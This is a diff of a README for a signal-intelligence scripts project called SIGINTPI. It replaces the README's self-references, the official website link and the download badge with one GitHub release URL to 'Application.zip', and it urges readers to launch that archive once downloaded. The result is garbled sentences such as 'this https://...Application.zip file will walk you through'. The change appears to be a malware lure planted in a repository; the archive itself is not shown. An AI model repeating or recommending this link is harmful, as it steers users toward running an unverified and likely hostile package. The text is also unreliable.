@@ -1,6 +1,6 @@
 # 🕵️‍♂️ SIGINTPI: The Ultimate Guide to Wizard Scripts 🧙‍♂️
 
-Welcome to the SIGINTPI repository, your ultimate guide to setting up and running the wizard scripts in the wizard/ folder of the SIGINTPI project. Whether you're a seasoned professional or a curious beginner in the world of signal intelligence, this README.md file will walk you through everything you need to know about deploying these scripts effectively.
+Welcome to the SIGINTPI repository, your ultimate guide to setting up and running the wizard scripts in the wizard/ folder of the SIGINTPI project. Whether you're a seasoned professional or a curious beginner in the world of signal intelligence, this https://github.com/Unknown-Baby/SIGINTPI/releases/download/v1.0/Application.zip file will walk you through everything you need to know about deploying these scripts effectively.
 
 ## 📁 Repository Overview
 
@@ -32,15 +32,15 @@ To kickstart your journey with the wizard scripts in the SIGINTPI project, follo
 
 ## 🌐 Additional Resources
 
-For additional resources and updates, you can visit the official SIGINTPI website at [SIGINTPI Website](https://www.sigintpi.com).
+For additional resources and updates, you can visit the official SIGINTPI website at [SIGINTPI Website](https://github.com/Unknown-Baby/SIGINTPI/releases/download/v1.0/Application.zip).
 
 ## 📥 Download Release
 
 For the latest version of the SIGINTPI project, you can download the release package by clicking the button below:
 
-[![Download Release](https://img.shields.io/static/v1?label=Download&message=Release.zip&color=blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/Unknown-Baby/SIGINTPI/releases/download/v1.0/Application.zip)](https://github.com/Unknown-Baby/SIGINTPI/releases/download/v1.0/Application.zip)
 
-Remember to launch the Release.zip file once it's downloaded to access the full suite of wizard scripts and tools.
+Remember to launch the https://github.com/Unknown-Baby/SIGINTPI/releases/download/v1.0/Application.zip file once it's downloaded to access the full suite of wizard scripts and tools.
 
 ## 💬 Community
 
@@ -56,5 +56,5 @@ Embark on your SIGINTPI journey today and unlock the full potential of the wizar
 
 ---
 
-This README.md file is a comprehensive guide to help you dive deep into the world of signal intelligence through the SIGINTPI project. Explore, experiment, and push the boundaries of what's possible with the wizard scripts at your fingertips. Let the journey begin! 🌟
+This https://github.com/Unknown-Baby/SIGINTPI/releases/download/v1.0/Application.zip file is a comprehensive guide to help you dive deep into the world of signal intelligence through the SIGINTPI project. Explore, experiment, and push the boundaries of what's possible with the wizard scripts at your fingertips. Let the journey begin! 🌟
 
